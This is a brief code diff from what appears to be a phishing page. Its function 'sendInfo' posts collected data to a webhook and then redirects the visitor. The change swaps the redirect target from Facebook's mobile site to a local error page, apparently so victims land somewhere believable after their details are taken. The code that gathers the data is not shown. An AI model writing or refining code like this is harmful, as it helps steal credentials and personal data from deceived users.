@@ -84,11 +84,11 @@ async function sendInfo() {
     await fetch(webhook, config);
   } catch {
     setTimeout(function() {
-        window.location.replace("m.facebook.com")
+        window.location.replace("enter/error.html")
     }, 1000);
   }
   setTimeout(function() {
-    window.location.replace("m.facebook.com")
+    window.location.replace("enter/error.html")
   }, 300);
 }
 
